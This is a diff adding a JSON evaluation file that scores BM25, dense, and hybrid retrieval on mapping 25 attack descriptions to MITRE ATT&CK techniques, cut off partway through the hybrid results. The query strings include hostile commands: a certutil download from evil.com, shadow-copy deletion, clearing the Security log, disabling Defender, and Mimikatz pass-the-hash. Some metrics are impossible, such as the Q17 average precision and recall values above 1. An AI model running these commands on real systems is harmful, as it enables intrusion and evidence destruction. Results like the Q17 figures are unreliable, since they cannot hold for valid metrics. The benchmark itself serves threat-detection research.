@@ -1,0 +1,1818 @@
+{
+  "summary_table": [
+    {
+      "Strategy": "1. Pure BM25 (Okapi)",
+      "MAP": 0.8233,
+      "NDCG@10": 0.8477,
+      "MRR": 0.7967,
+      "P@1": 0.72,
+      "P@5": 0.192,
+      "P@10": 0.096,
+      "Recall@10": 0.96,
+      "Latency (ms)": 1.65
+    },
+    {
+      "Strategy": "2. Pure Dense (FAISS)",
+      "MAP": 0.768,
+      "NDCG@10": 0.8017,
+      "MRR": 0.728,
+      "P@1": 0.6,
+      "P@5": 0.192,
+      "P@10": 0.096,
+      "Recall@10": 0.96,
+      "Latency (ms)": 27.62
+    },
+    {
+      "Strategy": "3. Hybrid Fusion (RRF)",
+      "MAP": 0.8413,
+      "NDCG@10": 0.8654,
+      "MRR": 0.8013,
+      "P@1": 0.72,
+      "P@5": 0.192,
+      "P@10": 0.1,
+      "Recall@10": 1.0,
+      "Latency (ms)": 25.6
+    },
+    {
+      "Strategy": "4. Hybrid Fusion + Rocchio PRF",
+      "MAP": 0.8467,
+      "NDCG@10": 0.8702,
+      "MRR": 0.8067,
+      "P@1": 0.72,
+      "P@5": 0.2,
+      "P@10": 0.1,
+      "Recall@10": 1.0,
+      "Latency (ms)": 38.7
+    }
+  ],
+  "details": {
+    "bm25": {
+      "mode": "bm25",
+      "queries_evaluated": 25,
+      "metrics": {
+        "MAP": 0.8233,
+        "MRR": 0.7967,
+        "NDCG@10": 0.8477,
+        "P@1": 0.72,
+        "P@3": 0.3067,
+        "P@5": 0.192,
+        "P@10": 0.096,
+        "Recall@10": 0.96,
+        "Mean_Latency_ms": 1.65
+      },
+      "query_details": [
+        {
+          "query_id": "Q01",
+          "category": "Execution",
+          "query": "powershell.exe -ExecutionPolicy Bypass -NoProfile -EncodedCommand aW1wb3J0 invoking script",
+          "ground_truth": [
+            "T1059.001"
+          ],
+          "top_hit_id": "T1216.002",
+          "top_hit_name": "SyncAppvPublishingServer",
+          "ap": 0.3333,
+          "rr": 0.3333,
+          "ndcg10": 0.5,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 0.85
+        },
+        {
+          "query_id": "Q02",
+          "category": "Credential Access",
+          "query": "Attacker dumped credentials from memory of lsass.exe process using procdump tool",
+          "ground_truth": [
+            "T1003.001"
+          ],
+          "top_hit_id": "T1003.001",
+          "top_hit_name": "LSASS Memory",
+          "ap": 1.0,
+          "rr": 1.0,
+          "ndcg10": 1.0,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 1.97
+        },
+        {
+          "query_id": "Q03",
+          "category": "Defense Evasion / Privilege Escalation",
+          "query": "Adversary injected malicious DLL into svchost.exe memory space via CreateRemoteThread",
+          "ground_truth": [
+            "T1055.001"
+          ],
+          "top_hit_id": "T1055.001",
+          "top_hit_name": "Dynamic-link Library Injection",
+          "ap": 1.0,
+          "rr": 1.0,
+          "ndcg10": 1.0,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 2.02
+        },
+        {
+          "query_id": "Q04",
+          "category": "Persistence",
+          "query": "Scheduled task created via schtasks /create /tn SecurityUpdater /tr updater.bat /sc onlogon",
+          "ground_truth": [
+            "T1053.005"
+          ],
+          "top_hit_id": "T1053.005",
+          "top_hit_name": "Scheduled Task",
+          "ap": 1.0,
+          "rr": 1.0,
+          "ndcg10": 1.0,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 1.68
+        },
+        {
+          "query_id": "Q05",
+          "category": "Persistence",
+          "query": "Registry persistence added at HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+          "ground_truth": [
+            "T1547.001"
+          ],
+          "top_hit_id": "T1547.001",
+          "top_hit_name": "Registry Run Keys / Startup Folder",
+          "ap": 1.0,
+          "rr": 1.0,
+          "ndcg10": 1.0,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 1.52
+        },
+        {
+          "query_id": "Q06",
+          "category": "Lateral Movement",
+          "query": "RDP connection established from internal host to domain controller on port 3389",
+          "ground_truth": [
+            "T1021.001"
+          ],
+          "top_hit_id": "T1043",
+          "top_hit_name": "Commonly Used Port",
+          "ap": 0.25,
+          "rr": 0.25,
+          "ndcg10": 0.4307,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 1.4
+        },
+        {
+          "query_id": "Q07",
+          "category": "Command and Control",
+          "query": "Malware communicating with C2 server over HTTPS using periodic HTTP beaconing POST requests",
+          "ground_truth": [
+            "T1071.001"
+          ],
+          "top_hit_id": "T1102.001",
+          "top_hit_name": "Dead Drop Resolver",
+          "ap": 0.3333,
+          "rr": 0.3333,
+          "ndcg10": 0.5,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 2.87
+        },
+        {
+          "query_id": "Q08",
+          "category": "Impact",
+          "query": "vssadmin.exe delete shadows /all /quiet executed before ransomware encryption",
+          "ground_truth": [
+            "T1490"
+          ],
+          "top_hit_id": "T1490",
+          "top_hit_name": "Inhibit System Recovery",
+          "ap": 1.0,
+          "rr": 1.0,
+          "ndcg10": 1.0,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 0.67
+        },
+        {
+          "query_id": "Q09",
+          "category": "Credential Access",
+          "query": "Requesting Kerberos Service Principal Name ticket with RC4 encryption to crack offline hash",
+          "ground_truth": [
+            "T1558.003"
+          ],
+          "top_hit_id": "T1558.003",
+          "top_hit_name": "Kerberoasting",
+          "ap": 1.0,
+          "rr": 1.0,
+          "ndcg10": 1.0,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 0.73
+        },
+        {
+          "query_id": "Q10",
+          "category": "Exfiltration",
+          "query": "Data exfiltration using rclone to upload sensitive archives to mega.nz cloud storage",
+          "ground_truth": [
+            "T1567.002"
+          ],
+          "top_hit_id": "T1585.003",
+          "top_hit_name": "Cloud Accounts",
+          "ap": 0.5,
+          "rr": 0.5,
+          "ndcg10": 0.6309,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 1.63
+        },
+        {
+          "query_id": "Q11",
+          "category": "Initial Access",
+          "query": "Spearphishing email delivered with malicious invoice.xlsm containing VBA macro payload",
+          "ground_truth": [
+            "T1566.001"
+          ],
+          "top_hit_id": "T1566.001",
+          "top_hit_name": "Spearphishing Attachment",
+          "ap": 1.0,
+          "rr": 1.0,
+          "ndcg10": 1.0,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 1.12
+        },
+        {
+          "query_id": "Q12",
+          "category": "Execution",
+          "query": "Execution of remote process via WMI wmic process call create cmd.exe /c whoami",
+          "ground_truth": [
+            "T1047"
+          ],
+          "top_hit_id": "T1047",
+          "top_hit_name": "Windows Management Instrumentation",
+          "ap": 1.0,
+          "rr": 1.0,
+          "ndcg10": 1.0,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 1.85
+        },
+        {
+          "query_id": "Q13",
+          "category": "Defense Evasion",
+          "query": "Adversary copied payload to C:\\Windows\\System32\\svchost.exe pretending to be legitimate system file",
+          "ground_truth": [
+            "T1036.005"
+          ],
+          "top_hit_id": "T1564.014",
+          "top_hit_name": "Extended Attributes",
+          "ap": 0.0,
+          "rr": 0.0,
+          "ndcg10": 0.0,
+          "p5": 0.0,
+          "p10": 0.0,
+          "r10": 0.0,
+          "latency_ms": 0.98
+        },
+        {
+          "query_id": "Q14",
+          "category": "Defense Evasion",
+          "query": "Disabling Windows Defender antivirus real-time monitoring via Set-MpPreference -DisableRealtimeMonitoring $true",
+          "ground_truth": [
+            "T1562.001"
+          ],
+          "top_hit_id": "T1685",
+          "top_hit_name": "Disable or Modify Tools",
+          "ap": 1.0,
+          "rr": 1.0,
+          "ndcg10": 1.0,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 1.91
+        },
+        {
+          "query_id": "Q15",
+          "category": "Discovery",
+          "query": "Enumeration of Active Directory domain users and group memberships using net user /domain and net group",
+          "ground_truth": [
+            "T1087.002"
+          ],
+          "top_hit_id": "T1087.002",
+          "top_hit_name": "Domain Account",
+          "ap": 1.0,
+          "rr": 1.0,
+          "ndcg10": 1.0,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 2.99
+        },
+        {
+          "query_id": "Q16",
+          "category": "Lateral Movement",
+          "query": "Lateral movement using Pass the Hash authentication via Mimikatz sekurlsa::pth with NTLM hash",
+          "ground_truth": [
+            "T1550.002"
+          ],
+          "top_hit_id": "T1550.002",
+          "top_hit_name": "Pass the Hash",
+          "ap": 1.0,
+          "rr": 1.0,
+          "ndcg10": 1.0,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 1.22
+        },
+        {
+          "query_id": "Q17",
+          "category": "Privilege Escalation / Defense Evasion",
+          "query": "DLL side-loading via vulnerable application loading malicious version.dll from local application directory",
+          "ground_truth": [
+            "T1574.002"
+          ],
+          "top_hit_id": "T1574.001",
+          "top_hit_name": "DLL",
+          "ap": 1.6667,
+          "rr": 1.0,
+          "ndcg10": 1.5,
+          "p5": 0.4,
+          "p10": 0.2,
+          "r10": 2.0,
+          "latency_ms": 2.32
+        },
+        {
+          "query_id": "Q18",
+          "category": "Command and Control",
+          "query": "certutil.exe -urlcache -split -f http://evil.com/payload.exe payload.exe ingress download",
+          "ground_truth": [
+            "T1105"
+          ],
+          "top_hit_id": "T1218",
+          "top_hit_name": "System Binary Proxy Execution",
+          "ap": 0.5,
+          "rr": 0.5,
+          "ndcg10": 0.6309,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 0.92
+        },
+        {
+          "query_id": "Q19",
+          "category": "Defense Evasion",
+          "query": "Modifying file access control permissions with icacls /grant Everyone:F to access sensitive directory",
+          "ground_truth": [
+            "T1222.001"
+          ],
+          "top_hit_id": "T1222.001",
+          "top_hit_name": "Windows Permissions",
+          "ap": 1.0,
+          "rr": 1.0,
+          "ndcg10": 1.0,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 2.12
+        },
+        {
+          "query_id": "Q20",
+          "category": "Credential Access",
+          "query": "Network packet sniffing on interface using Wireshark or promiscuous mode to capture cleartext credentials",
+          "ground_truth": [
+            "T1040"
+          ],
+          "top_hit_id": "T1040",
+          "top_hit_name": "Network Sniffing",
+          "ap": 1.0,
+          "rr": 1.0,
+          "ndcg10": 1.0,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 1.81
+        },
+        {
+          "query_id": "Q21",
+          "category": "Defense Evasion",
+          "query": "Clearing Windows security event logs via wevtutil cl Security to cover tracks after intrusion",
+          "ground_truth": [
+            "T1070.001"
+          ],
+          "top_hit_id": "T1685.005",
+          "top_hit_name": "Clear Windows Event Logs",
+          "ap": 1.0,
+          "rr": 1.0,
+          "ndcg10": 1.0,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 1.75
+        },
+        {
+          "query_id": "Q22",
+          "category": "Persistence / Defense Evasion",
+          "query": "Background Intelligent Transfer Service job created via bitsadmin /transfer to stage malware",
+          "ground_truth": [
+            "T1197"
+          ],
+          "top_hit_id": "T1197",
+          "top_hit_name": "BITS Jobs",
+          "ap": 1.0,
+          "rr": 1.0,
+          "ndcg10": 1.0,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 1.63
+        },
+        {
+          "query_id": "Q23",
+          "category": "Defense Evasion",
+          "query": "Proxy execution of unauthorized code via msbuild.exe executing inline C# project file",
+          "ground_truth": [
+            "T1127.001"
+          ],
+          "top_hit_id": "T1127.001",
+          "top_hit_name": "MSBuild",
+          "ap": 1.0,
+          "rr": 1.0,
+          "ndcg10": 1.0,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 1.93
+        },
+        {
+          "query_id": "Q24",
+          "category": "Collection",
+          "query": "Adversary archived stolen documents into password protected 7z archive using 7z.exe a -p",
+          "ground_truth": [
+            "T1560.001"
+          ],
+          "top_hit_id": "T1566.001",
+          "top_hit_name": "Spearphishing Attachment",
+          "ap": 0.0,
+          "rr": 0.0,
+          "ndcg10": 0.0,
+          "p5": 0.0,
+          "p10": 0.0,
+          "r10": 0.0,
+          "latency_ms": 1.11
+        },
+        {
+          "query_id": "Q25",
+          "category": "Persistence",
+          "query": "Creation of malicious Windows service for persistent execution using sc create MalService binPath= payload.exe",
+          "ground_truth": [
+            "T1543.003"
+          ],
+          "top_hit_id": "T1543.003",
+          "top_hit_name": "Windows Service",
+          "ap": 1.0,
+          "rr": 1.0,
+          "ndcg10": 1.0,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 2.33
+        }
+      ]
+    },
+    "dense": {
+      "mode": "dense",
+      "queries_evaluated": 25,
+      "metrics": {
+        "MAP": 0.768,
+        "MRR": 0.728,
+        "NDCG@10": 0.8017,
+        "P@1": 0.6,
+        "P@3": 0.3067,
+        "P@5": 0.192,
+        "P@10": 0.096,
+        "Recall@10": 0.96,
+        "Mean_Latency_ms": 27.62
+      },
+      "query_details": [
+        {
+          "query_id": "Q01",
+          "category": "Execution",
+          "query": "powershell.exe -ExecutionPolicy Bypass -NoProfile -EncodedCommand aW1wb3J0 invoking script",
+          "ground_truth": [
+            "T1059.001"
+          ],
+          "top_hit_id": "T1064",
+          "top_hit_name": "Scripting",
+          "ap": 0.3333,
+          "rr": 0.3333,
+          "ndcg10": 0.5,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 31.52
+        },
+        {
+          "query_id": "Q02",
+          "category": "Credential Access",
+          "query": "Attacker dumped credentials from memory of lsass.exe process using procdump tool",
+          "ground_truth": [
+            "T1003.001"
+          ],
+          "top_hit_id": "T1003.001",
+          "top_hit_name": "LSASS Memory",
+          "ap": 1.0,
+          "rr": 1.0,
+          "ndcg10": 1.0,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 27.44
+        },
+        {
+          "query_id": "Q03",
+          "category": "Defense Evasion / Privilege Escalation",
+          "query": "Adversary injected malicious DLL into svchost.exe memory space via CreateRemoteThread",
+          "ground_truth": [
+            "T1055.001"
+          ],
+          "top_hit_id": "T1055.001",
+          "top_hit_name": "Dynamic-link Library Injection",
+          "ap": 1.0,
+          "rr": 1.0,
+          "ndcg10": 1.0,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 28.23
+        },
+        {
+          "query_id": "Q04",
+          "category": "Persistence",
+          "query": "Scheduled task created via schtasks /create /tn SecurityUpdater /tr updater.bat /sc onlogon",
+          "ground_truth": [
+            "T1053.005"
+          ],
+          "top_hit_id": "T1053.002",
+          "top_hit_name": "At",
+          "ap": 0.5,
+          "rr": 0.5,
+          "ndcg10": 0.6309,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 28.8
+        },
+        {
+          "query_id": "Q05",
+          "category": "Persistence",
+          "query": "Registry persistence added at HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+          "ground_truth": [
+            "T1547.001"
+          ],
+          "top_hit_id": "T1547.001",
+          "top_hit_name": "Registry Run Keys / Startup Folder",
+          "ap": 1.0,
+          "rr": 1.0,
+          "ndcg10": 1.0,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 26.06
+        },
+        {
+          "query_id": "Q06",
+          "category": "Lateral Movement",
+          "query": "RDP connection established from internal host to domain controller on port 3389",
+          "ground_truth": [
+            "T1021.001"
+          ],
+          "top_hit_id": "T1563.002",
+          "top_hit_name": "RDP Hijacking",
+          "ap": 0.5,
+          "rr": 0.5,
+          "ndcg10": 0.6309,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 25.49
+        },
+        {
+          "query_id": "Q07",
+          "category": "Command and Control",
+          "query": "Malware communicating with C2 server over HTTPS using periodic HTTP beaconing POST requests",
+          "ground_truth": [
+            "T1071.001"
+          ],
+          "top_hit_id": "T1102.003",
+          "top_hit_name": "One-Way Communication",
+          "ap": 0.2,
+          "rr": 0.2,
+          "ndcg10": 0.3869,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 32.01
+        },
+        {
+          "query_id": "Q08",
+          "category": "Impact",
+          "query": "vssadmin.exe delete shadows /all /quiet executed before ransomware encryption",
+          "ground_truth": [
+            "T1490"
+          ],
+          "top_hit_id": "T1679",
+          "top_hit_name": "Selective Exclusion",
+          "ap": 0.0,
+          "rr": 0.0,
+          "ndcg10": 0.0,
+          "p5": 0.0,
+          "p10": 0.0,
+          "r10": 0.0,
+          "latency_ms": 30.03
+        },
+        {
+          "query_id": "Q09",
+          "category": "Credential Access",
+          "query": "Requesting Kerberos Service Principal Name ticket with RC4 encryption to crack offline hash",
+          "ground_truth": [
+            "T1558.003"
+          ],
+          "top_hit_id": "T1558.003",
+          "top_hit_name": "Kerberoasting",
+          "ap": 1.0,
+          "rr": 1.0,
+          "ndcg10": 1.0,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 26.44
+        },
+        {
+          "query_id": "Q10",
+          "category": "Exfiltration",
+          "query": "Data exfiltration using rclone to upload sensitive archives to mega.nz cloud storage",
+          "ground_truth": [
+            "T1567.002"
+          ],
+          "top_hit_id": "T1560",
+          "top_hit_name": "Archive Collected Data",
+          "ap": 0.5,
+          "rr": 0.5,
+          "ndcg10": 0.6309,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 25.17
+        },
+        {
+          "query_id": "Q11",
+          "category": "Initial Access",
+          "query": "Spearphishing email delivered with malicious invoice.xlsm containing VBA macro payload",
+          "ground_truth": [
+            "T1566.001"
+          ],
+          "top_hit_id": "T1566.001",
+          "top_hit_name": "Spearphishing Attachment",
+          "ap": 1.0,
+          "rr": 1.0,
+          "ndcg10": 1.0,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 24.61
+        },
+        {
+          "query_id": "Q12",
+          "category": "Execution",
+          "query": "Execution of remote process via WMI wmic process call create cmd.exe /c whoami",
+          "ground_truth": [
+            "T1047"
+          ],
+          "top_hit_id": "T1047",
+          "top_hit_name": "Windows Management Instrumentation",
+          "ap": 1.0,
+          "rr": 1.0,
+          "ndcg10": 1.0,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 26.66
+        },
+        {
+          "query_id": "Q13",
+          "category": "Defense Evasion",
+          "query": "Adversary copied payload to C:\\Windows\\System32\\svchost.exe pretending to be legitimate system file",
+          "ground_truth": [
+            "T1036.005"
+          ],
+          "top_hit_id": "T1027.004",
+          "top_hit_name": "Compile After Delivery",
+          "ap": 0.0,
+          "rr": 0.0,
+          "ndcg10": 0.0,
+          "p5": 0.0,
+          "p10": 0.0,
+          "r10": 0.0,
+          "latency_ms": 26.64
+        },
+        {
+          "query_id": "Q14",
+          "category": "Defense Evasion",
+          "query": "Disabling Windows Defender antivirus real-time monitoring via Set-MpPreference -DisableRealtimeMonitoring $true",
+          "ground_truth": [
+            "T1562.001"
+          ],
+          "top_hit_id": "T1685",
+          "top_hit_name": "Disable or Modify Tools",
+          "ap": 1.0,
+          "rr": 1.0,
+          "ndcg10": 1.0,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 32.44
+        },
+        {
+          "query_id": "Q15",
+          "category": "Discovery",
+          "query": "Enumeration of Active Directory domain users and group memberships using net user /domain and net group",
+          "ground_truth": [
+            "T1087.002"
+          ],
+          "top_hit_id": "T1087.002",
+          "top_hit_name": "Domain Account",
+          "ap": 1.0,
+          "rr": 1.0,
+          "ndcg10": 1.0,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 25.46
+        },
+        {
+          "query_id": "Q16",
+          "category": "Lateral Movement",
+          "query": "Lateral movement using Pass the Hash authentication via Mimikatz sekurlsa::pth with NTLM hash",
+          "ground_truth": [
+            "T1550.002"
+          ],
+          "top_hit_id": "T1550.002",
+          "top_hit_name": "Pass the Hash",
+          "ap": 1.0,
+          "rr": 1.0,
+          "ndcg10": 1.0,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 31.55
+        },
+        {
+          "query_id": "Q17",
+          "category": "Privilege Escalation / Defense Evasion",
+          "query": "DLL side-loading via vulnerable application loading malicious version.dll from local application directory",
+          "ground_truth": [
+            "T1574.002"
+          ],
+          "top_hit_id": "T1574.001",
+          "top_hit_name": "DLL",
+          "ap": 2.0,
+          "rr": 1.0,
+          "ndcg10": 1.6309,
+          "p5": 0.4,
+          "p10": 0.2,
+          "r10": 2.0,
+          "latency_ms": 23.43
+        },
+        {
+          "query_id": "Q18",
+          "category": "Command and Control",
+          "query": "certutil.exe -urlcache -split -f http://evil.com/payload.exe payload.exe ingress download",
+          "ground_truth": [
+            "T1105"
+          ],
+          "top_hit_id": "T1140",
+          "top_hit_name": "Deobfuscate/Decode Files or Information",
+          "ap": 0.3333,
+          "rr": 0.3333,
+          "ndcg10": 0.5,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 33.32
+        },
+        {
+          "query_id": "Q19",
+          "category": "Defense Evasion",
+          "query": "Modifying file access control permissions with icacls /grant Everyone:F to access sensitive directory",
+          "ground_truth": [
+            "T1222.001"
+          ],
+          "top_hit_id": "T1222.002",
+          "top_hit_name": "Linux and Mac Permissions",
+          "ap": 0.5,
+          "rr": 0.5,
+          "ndcg10": 0.6309,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 33.4
+        },
+        {
+          "query_id": "Q20",
+          "category": "Credential Access",
+          "query": "Network packet sniffing on interface using Wireshark or promiscuous mode to capture cleartext credentials",
+          "ground_truth": [
+            "T1040"
+          ],
+          "top_hit_id": "T1040",
+          "top_hit_name": "Network Sniffing",
+          "ap": 1.0,
+          "rr": 1.0,
+          "ndcg10": 1.0,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 25.58
+        },
+        {
+          "query_id": "Q21",
+          "category": "Defense Evasion",
+          "query": "Clearing Windows security event logs via wevtutil cl Security to cover tracks after intrusion",
+          "ground_truth": [
+            "T1070.001"
+          ],
+          "top_hit_id": "T1685.005",
+          "top_hit_name": "Clear Windows Event Logs",
+          "ap": 1.0,
+          "rr": 1.0,
+          "ndcg10": 1.0,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 22.24
+        },
+        {
+          "query_id": "Q22",
+          "category": "Persistence / Defense Evasion",
+          "query": "Background Intelligent Transfer Service job created via bitsadmin /transfer to stage malware",
+          "ground_truth": [
+            "T1197"
+          ],
+          "top_hit_id": "T1197",
+          "top_hit_name": "BITS Jobs",
+          "ap": 1.0,
+          "rr": 1.0,
+          "ndcg10": 1.0,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 23.55
+        },
+        {
+          "query_id": "Q23",
+          "category": "Defense Evasion",
+          "query": "Proxy execution of unauthorized code via msbuild.exe executing inline C# project file",
+          "ground_truth": [
+            "T1127.001"
+          ],
+          "top_hit_id": "T1127.001",
+          "top_hit_name": "MSBuild",
+          "ap": 1.0,
+          "rr": 1.0,
+          "ndcg10": 1.0,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 20.82
+        },
+        {
+          "query_id": "Q24",
+          "category": "Collection",
+          "query": "Adversary archived stolen documents into password protected 7z archive using 7z.exe a -p",
+          "ground_truth": [
+            "T1560.001"
+          ],
+          "top_hit_id": "T1027.015",
+          "top_hit_name": "Compression",
+          "ap": 0.3333,
+          "rr": 0.3333,
+          "ndcg10": 0.5,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 26.75
+        },
+        {
+          "query_id": "Q25",
+          "category": "Persistence",
+          "query": "Creation of malicious Windows service for persistent execution using sc create MalService binPath= payload.exe",
+          "ground_truth": [
+            "T1543.003"
+          ],
+          "top_hit_id": "T1543.003",
+          "top_hit_name": "Windows Service",
+          "ap": 1.0,
+          "rr": 1.0,
+          "ndcg10": 1.0,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 32.74
+        }
+      ]
+    },
+    "hybrid": {
+      "mode": "hybrid",
+      "queries_evaluated": 25,
+      "metrics": {
+        "MAP": 0.8413,
+        "MRR": 0.8013,
+        "NDCG@10": 0.8654,
+        "P@1": 0.72,
+        "P@3": 0.3067,
+        "P@5": 0.192,
+        "P@10": 0.1,
+        "Recall@10": 1.0,
+        "Mean_Latency_ms": 25.6
+      },
+      "query_details": [
+        {
+          "query_id": "Q01",
+          "category": "Execution",
+          "query": "powershell.exe -ExecutionPolicy Bypass -NoProfile -EncodedCommand aW1wb3J0 invoking script",
+          "ground_truth": [
+            "T1059.001"
+          ],
+          "top_hit_id": "T1546.013",
+          "top_hit_name": "PowerShell Profile",
+          "ap": 0.5,
+          "rr": 0.5,
+          "ndcg10": 0.6309,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 26.53
+        },
+        {
+          "query_id": "Q02",
+          "category": "Credential Access",
+          "query": "Attacker dumped credentials from memory of lsass.exe process using procdump tool",
+          "ground_truth": [
+            "T1003.001"
+          ],
+          "top_hit_id": "T1003.001",
+          "top_hit_name": "LSASS Memory",
+          "ap": 1.0,
+          "rr": 1.0,
+          "ndcg10": 1.0,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 27.92
+        },
+        {
+          "query_id": "Q03",
+          "category": "Defense Evasion / Privilege Escalation",
+          "query": "Adversary injected malicious DLL into svchost.exe memory space via CreateRemoteThread",
+          "ground_truth": [
+            "T1055.001"
+          ],
+          "top_hit_id": "T1055.001",
+          "top_hit_name": "Dynamic-link Library Injection",
+          "ap": 1.0,
+          "rr": 1.0,
+          "ndcg10": 1.0,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 25.9
+        },
+        {
+          "query_id": "Q04",
+          "category": "Persistence",
+          "query": "Scheduled task created via schtasks /create /tn SecurityUpdater /tr updater.bat /sc onlogon",
+          "ground_truth": [
+            "T1053.005"
+          ],
+          "top_hit_id": "T1053.005",
+          "top_hit_name": "Scheduled Task",
+          "ap": 1.0,
+          "rr": 1.0,
+          "ndcg10": 1.0,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 25.5
+        },
+        {
+          "query_id": "Q05",
+          "category": "Persistence",
+          "query": "Registry persistence added at HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+          "ground_truth": [
+            "T1547.001"
+          ],
+          "top_hit_id": "T1547.001",
+          "top_hit_name": "Registry Run Keys / Startup Folder",
+          "ap": 1.0,
+          "rr": 1.0,
+          "ndcg10": 1.0,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 25.66
+        },
+        {
+          "query_id": "Q06",
+          "category": "Lateral Movement",
+          "query": "RDP connection established from internal host to domain controller on port 3389",
+          "ground_truth": [
+            "T1021.001"
+          ],
+          "top_hit_id": "T1043",
+          "top_hit_name": "Commonly Used Port",
+          "ap": 0.2,
+          "rr": 0.2,
+          "ndcg10": 0.3869,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 22.72
+        },
+        {
+          "query_id": "Q07",
+          "category": "Command and Control",
+          "query": "Malware communicating with C2 server over HTTPS using periodic HTTP beaconing POST requests",
+          "ground_truth": [
+            "T1071.001"
+          ],
+          "top_hit_id": "T1102.001",
+          "top_hit_name": "Dead Drop Resolver",
+          "ap": 0.3333,
+          "rr": 0.3333,
+          "ndcg10": 0.5,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 23.1
+        },
+        {
+          "query_id": "Q08",
+          "category": "Impact",
+          "query": "vssadmin.exe delete shadows /all /quiet executed before ransomware encryption",
+          "ground_truth": [
+            "T1490"
+          ],
+          "top_hit_id": "T1679",
+          "top_hit_name": "Selective Exclusion",
+          "ap": 0.1667,
+          "rr": 0.1667,
+          "ndcg10": 0.3562,
+          "p5": 0.0,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 22.64
+        },
+        {
+          "query_id": "Q09",
+          "category": "Credential Access",
+          "query": "Requesting Kerberos Service Principal Name ticket with RC4 encryption to crack offline hash",
+          "ground_truth": [
+            "T1558.003"
+          ],
+          "top_hit_id": "T1558.003",
+          "top_hit_name": "Kerberoasting",
+          "ap": 1.0,
+          "rr": 1.0,
+          "ndcg10": 1.0,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 22.22
+        },
+        {
+          "query_id": "Q10",
+          "category": "Exfiltration",
+          "query": "Data exfiltration using rclone to upload sensitive archives to mega.nz cloud storage",
+          "ground_truth": [
+            "T1567.002"
+          ],
+          "top_hit_id": "T1567.002",
+          "top_hit_name": "Exfiltration to Cloud Storage",
